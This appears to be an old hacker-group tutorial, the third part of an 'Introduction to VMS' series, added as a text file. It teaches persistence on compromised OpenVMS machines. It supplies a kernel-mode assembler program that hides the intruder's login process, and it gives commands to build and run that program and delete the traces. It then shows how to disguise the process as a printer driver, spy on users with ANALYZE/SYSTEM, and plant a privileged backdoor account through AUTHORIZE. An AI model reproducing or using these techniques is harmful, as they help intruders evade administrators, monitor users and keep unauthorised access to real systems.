@@ -1,0 +1,285 @@
+Introduction to VMS - Part III.
+gr1p@b4b0.org
+
+Like I said, Part III would be here very soon, so we can continue the
+introduction to VMS with this paper and move onto some more interesting 
+stuff later.  In the last paper in this Introductionary series I covered 
+topics relating to gaining entry to the box, looking at user privileges 
+and how to gain more accounts etc.  This paper is basically going to
+carry on where Part II left off.  I am going to demonstrate how to attempt
+to make yourself invisible to other users in hope to keep access for as 
+long as possible etc.  I will also outline possible ways to spy on users 
+and monitor system activity as well as adding system accounts.
+
+--> Making yourself invisible
+
+Most of the content in this section really comes down to common sense, and
+the awareness that you must have for people around you on the machine.  
+For example, if you go around deleting users data, you are going to arouse 
+suspicion, and therefore increase the chances of you getting caught.  The 
+idea is to keep access for as long as possible, therefore, the idea is to 
+cut out suspicious activity and play it safe.
+
+There are many steps you must take to ensure that you are hid on the system,
+i'll try to outline as many as I can..
+
+The first thing to be done is to hide form the SHOW USER command, similar to
+who in UNIX, which, when used allows anyone to see all the users on the
+system.  As you need to appear as a ghost on the system, you need to do 
+something to make you hidden when someone initiates the SHOW USER command.  
+Something a lot of people do is to make their login process a non-interactive 
+process which therefore means that your login doesn't show up when someone 
+uses the SHOW USER command, however, your login process would still be visible
+if someone used the SHOW SYSTEM command.  The way around that, which I was 
+originally shown, and still use due to its effeciency is to diguise your login 
+process as the process of a printer driver which shows up under the SHOW SYSTEM 
+command.
+
+When you do a SHOW SYSTEM command at your DCL command prompt you will gain
+all the information about the current system, process information, information 
+on drivers etc.  You will notice names similar to the following driver names.. 
+
+SYMBIONT_11, NETBIOS, CRON ,OPERATOR. etc.
+
+Below is a short sample SHOW SYSTEM command table (not a complete table).
+
+0000010A AUDIT_SERVER    HIB     9      77   0 00:00:00.21     592    626
+0000010B JOB_CONTROL     HIB     9     418   0 00:00:00.77     239    378
+0000010C QUEUE_MANAGER   HIB     8    1936   0 00:00:07.75    1128   1514
+0000010D SECURITY_SERVER HIB    10     102   0 00:00:00.65    1140   1344
+00000126 AppleTalk ACP   HIB     9      49   0 00:00:00.08     195    356
+00000127 ATKGW$ACP       HIB     9      53   0 00:00:00.04     131    220
+00000128 MSAF$SERVER0    HIB     6    4750   0 00:00:07.42    1842    122
+00000129 SYMBIONT_8      HIB     4       8   0 00:00:00.11     432     77
+0000012A MSAP$RCVR0      HIB     6      31   0 00:00:00.24     982    666
+0000012B SYMBIONT_9      HIB     4       8   0 00:00:00.14     453     92
+0000012C MSAP$RCVR1      HIB     6      23   0 00:00:00.21    1021    561
+0000012D MSAP$RCVR2      HIB     6      16   0 00:00:00.17     911    516
+0000012E SYMBIONT_10     HIB     4       8   0 00:00:00.13     438     77
+00000130 SYMBIONT_11     HIB     4       8   0 00:00:00.13     453     92
+00000131 MSAP$RCVR4      HIB     6      23   0 00:00:00.19    1022    516
+00000132 MSAP$RCVR5      HIB     6      37   0 00:00:00.13    1001    516
+00000134 CRON            HIB     6     458   0 00:00:01.91     339    406
+0000015A GIT393          HIB     5    1810   0 00:00:01.02    1269    710
+00000162 AEB477          HIB     6    4486   0 00:00:02.13    1861    717
+00000165 MKR121          HIB     5     873   0 00:00:00.82    1383    732
+
+You will notice from the SHOW SYSTEM command table above, and probably from
+ones you find yourselves that they (probably) contain quite a few SYMBIONT_**
+entries.  These are Printer drivers, and if the machine is on a .edu subnet 
+the SHOW SYSTEM command table will probably contain quite a few entries of 
+printer drivers.  This is a perfect place to hide your login process and 
+therefore become invisible on the system.
+
+What I usually do is change my login process to appear as SYMBIONT_666 on
+the SHOW SYSTEM table.  This results in my login process appearing to be a 
+printer driver to anyone who uses the SHOW SYSTEM command.  To use the above
+SHOW SYSTEM table as an example, our username is MKR121, remember that!  To
+change your login process to the process of an extra printer driver you will 
+find below an assembler script that can be used on a VMS system.  This script 
+is entitled stealth.mar, I have no knowledge who coded it originally.
+
+				-- snip --
+
+.library /sys$library:lib.mlb/
+
+.link /sys$system:sys.stb/
+
+$pcbdef
+
+.entry no_user,^m<>
+
+$cmkrnl_s routin=blast_it
+
+ret
+
+.entry blast_it,^m<>
+
+tstl pcb$l_owner(r4)
+
+bneq outta_here
+
+bbcc #pcb$v_inter,pcb$l_sts(r4),outta_here
+
+clrb pcb$t_terminal(r4)
+
+decw g^sys$gw_ijobcnt
+
+bisl #pcb$m_noacnt,pcb$l_sts(r4)
+
+outta_here:
+
+movl #ss$_normal,r0
+
+ret
+
+.end no_user
+
+				-- snip --
+
+To get this script onto the system firstly run the command.
+
+$ create stealth.mar
+
+Then put the code into the editor, once the code is entered hit ctrl-Z to
+exit the create editor and return to the DCL prompt.  Now that the stealth.mar
+file is on the system, you need to assemble, link and run to become a hidden 
+login process.  To do the above just follow the command lines below that will 
+then run the stealth.mar program and clean up afterwards.
+
+$ macro stealth
+
+$ link /nomap stealth
+
+$ delete stealth.obj;*
+
+$ delete stealth.mar;*
+
+$ run stealth
+
+$ del stealth.exe;*
+
+Once you have done the following look at the show system table which will be
+on you terminal.  Look for the last SYMBIONT_** entry. eg. SYMBIONT_11 and 
+then add a few numbers onto that driver for use as your own "hidden login 
+process printer driver".  I usually use SYMBIONT_666 but it is sensible to 
+use the number after the last printer driver entry on the list, in the 
+case I highlighted before, SYMBIONT_11 which would result in us hiding out
+login process as SYMBIONT_12 by running the below command line.
+
+$ set proc/name="SYMBIONT_12"
+
+This will then rename your login process as SYMBIONT_12, a printer driver to
+the normal eye, and therefore hiding you within the system as we can see
+when we run the SHOW SYSTEM command once more..
+
+0000010A AUDIT_SERVER    HIB    9      77   0 00:00:00.21     592   626
+0000010B JOB_CONTROL     HIB    9     418   0 00:00:00.77     239   378
+0000010C QUEUE_MANAGER   HIB    8    1936   0 00:00:07.75    1128  1514
+0000010D SECURITY_SERVER HIB   10     102   0 00:00:00.65    1140  1344
+00000126 AppleTalk ACP   HIB    9      49   0 00:00:00.08     195   356
+00000127 ATKGW$ACP       HIB    9      53   0 00:00:00.04     131   220
+00000128 MSAF$SERVER0    HIB    6    4750   0 00:00:07.42    1842   122
+00000129 SYMBIONT_8      HIB    4       8   0 00:00:00.11     432    77
+0000012A MSAP$RCVR0      HIB    6      31   0 00:00:00.24     982   666
+0000012B SYMBIONT_9      HIB    4       8   0 00:00:00.14     453    92
+0000012C MSAP$RCVR1      HIB    6      23   0 00:00:00.21    1021   561
+0000012D MSAP$RCVR2      HIB    6      16   0 00:00:00.17     911   516
+0000012E SYMBIONT_10     HIB    4       8   0 00:00:00.13     438    77
+00000130 SYMBIONT_11     HIB    4       8   0 00:00:00.13     453    92
+00000131 MSAP$RCVR4      HIB    6      23   0 00:00:00.19    1022   516
+00000132 MSAP$RCVR5      HIB    6      37   0 00:00:00.13    1001   516
+00000134 CRON            HIB    6     458   0 00:00:01.91     339   406
+0000015A GIT393          HIB    5    1810   0 00:00:01.02    1269   710
+00000162 AEB477          HIB    6    4486   0 00:00:02.13    1861   717
+00000165 SYMBIONT_12     HIB    5     873   0 00:00:00.82    1383   732
+
+Notice how SYMBIONT_12 has replaced the process that was once called MKR121
+aka your login process, therefore you are now perfectly hidden from other users. 
+
+--> Monitoring Activity
+
+There are many ways to monitor activity, from simply seeing who is logged
+onto the box with the SHOW USER command to more indepth monitoring such as the
+ANALYZE commands.  If you have the CMKRNL privilege, which if you rememeber from
+partII of this guide is the Kernel access mode and one of the most important 
+and powerful privileges on a VMS box, you can use the ANALYZE/SYSTEM command
+which will give you an extremly detailed breakdown of what each user is doing on
+the box.  The ANALYZE command is the best command to examine the machine 
+further.  You can monitor users system status, memory usage, file usage, what 
+they are accessing, etc.  This command is the ultimate monitoring command in 
+VMS and should always be used if you have obtained the CMKRNL privilege.  
+Another ANALYZE command is the ANALYZE/AUDIT command which will load up the 
+Audit Analysis Utility which extracts information direct from the system 
+security audit journal which can be very useful information.  Other ANALYZE 
+commands are as follows (bits taken from HELP)..
+
+ANALYZE/DISK_STRUCTURE which is basically similar to the UNIX df command and 
+will display information about disk volumes on the machine.
+
+ANALYZE/ERROR_LOG which will report the contents of the error_log file.
+
+ANALYZE/IMAGE will describe the contents of an image file.
+
+ANALYZE/OBJECT will describe the contents of an object modules.
+
+As you can see from what I have described so far in this section the ANALYZE 
+command can give you a lot of information about your hacked system and its 
+users, _providing_ you have the CMKRNL privilege, its important to rememeber 
+that. 
+
+Another important command for looking at system activity, not so much
+monitoring current activity, but looking at past activity is to use the SHOW 
+command.  The SHOW command can however only really be used to monitor your 
+own account, but if it is an account that has been "stolen" then you will 
+still find out some interesting information here.
+Some uses of the SHOW command are as follows (from HELP)..
+
+SHOW/QUOTA will display your current disk quota on the boxes disk volume.
+
+SHOW/DEFAULT will display the current default device and directory.
+
+SHOW/ERROR will display the error count for all devices with error counts
+above zero.
+
+SHOW/WORKING_SET will display the working set limit, quota, and extent
+assigned to the current process.
+
+SHOW/ACCOUNTING will show which resources the current accounting file is
+tracking.
+
+As you can see from the above few commands, SHOW has some power to help you
+gain information about your account, however, it is not as powerful as the
+ANALYZE command.
+
+--> Adding your own accounts
+
+You may feel confident that you can get away with adding your own accounts
+to a VMS box, and this is easily done with the following few command lines.
+
+You need to use the AUTHORIZE program which is found in the sys$system
+directory along with the password file and other use data, therefore to execute
+AUTHORIZE you must firstly be in the correct command path.
+
+$ sd sys$system
+
+Next, run the autorize program.
+
+$ run authorize
+
+This will then present you with the following prompt, funnily enough called
+a UAF prompt.
+
+UAF>
+
+UAF stands for User Authorization file and this is where you make your
+modifications to make your new account.  To add an account you finally need 
+to run the following command line at the UAF prompt.
+
+UAF> add gr1p /password=t34mb4b0/priv=setprv
+
+This add's the user gr1p with the password t34mb4b0 to the box.  UAF add's
+the data to both the sysuaf.dat file and the rightslist.dat file.  The above 
+account was setup with the privilege setprv which is a very high privilege but 
+not really what we would called a "superuser" so it therefore doesn't look as 
+inconspicious as a superuser account.  I take it most of you will know that 
+when dealing with a UNIX system, if you add a UID/GID 0 account to /etc/passwd 
+it will look _very_ conspicious.  The same stands for a VMS box and high 
+privileged accounts.
+
+That concludes my III-Part Introduction to VMS, you should now have the
+basic knowledge needed to explore the world of VMS hacking, good luck. :)
+
+I'd just like to say werd to Substance for always keeping 9x tight.  
+Remember, only you can do it bro. :>
+
+Finally, as always, the links..
+
+9x   -> http://www2.dope.org/9x
+b4b0 -> http://www.b4b0.org 
+
+Look out for more VMS related texts soon..
+
+gr1p
+gr1p@b4b0.org
+http://www.b4b0.org/gr1p  
